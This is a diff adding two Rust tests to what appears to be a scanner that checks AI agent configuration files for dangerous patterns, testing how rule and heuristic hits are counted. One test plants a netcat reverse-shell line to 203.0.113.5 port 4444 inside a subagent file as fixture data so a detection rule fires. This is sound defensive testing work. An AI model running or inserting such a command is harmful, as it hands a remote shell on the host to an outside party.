@@ -169,3 +169,46 @@ fn a_fixture_without_bytes_does_not_load() {
         Fixture::load("0001-decode-pipe-exec", true, &path).expect_err("a fixture carries bytes");
     assert!(error.problem.contains("neither"), "{error}");
 }
+
+/// The Heuristic tier fires on what the Rule tier narrowed away, so a Rule's
+/// near miss is often a Heuristic's hit. The runner counts those instead of
+/// failing the Fixture, and the count is what a rule author reads to see how
+/// loud a new Heuristic is.
+#[test]
+fn a_heuristic_on_another_rules_fixture_is_counted_and_not_a_failure() {
+    let pack = RulePack::bundled().expect("the bundled pack compiles");
+    let fixture = corpus_fixtures()
+        .into_iter()
+        .find(|fixture| {
+            fixture.id()
+                == "0002-reverse-shell-and-permission-bypass/good/instruction-documents-flag"
+        })
+        .expect("the fixture is in the corpus");
+
+    let outcome = &corpus::run(&pack, &[fixture]).expect("the fixture scans")[0];
+    assert!(outcome.passed(), "{}", outcome.report());
+    assert!(outcome.expected.is_empty(), "the fixture names no rule");
+    assert!(
+        outcome.also_fired.contains(&501),
+        "an agent command line was spawned: {:?}",
+        outcome.also_fired
+    );
+    assert_eq!(corpus::heuristic_hits(&[outcome.clone()])[&501], 1);
+}
+
+/// A tier 1 Rule firing where no Fixture named it is still a failure, whatever
+/// the Heuristics did.
+#[test]
+fn a_rule_that_fires_unnamed_still_fails_the_fixture() {
+    let pack = RulePack::bundled().expect("the bundled pack compiles");
+    let mut fixture = corpus_fixtures()
+        .into_iter()
+        .find(|fixture| fixture.id() == "0500-unrestricted-bash-tool/good/subagent-without-bash")
+        .expect("the fixture is in the corpus");
+    fixture.units[0].bytes =
+        b"---\nname: reviewer\n---\n\nnc 203.0.113.5 4444 -e /bin/sh\n".to_vec();
+
+    let outcome = &corpus::run(&pack, &[fixture]).expect("the fixture scans")[0];
+    assert!(!outcome.passed());
+    assert!(outcome.report().contains("[2]"), "{}", outcome.report());
+}
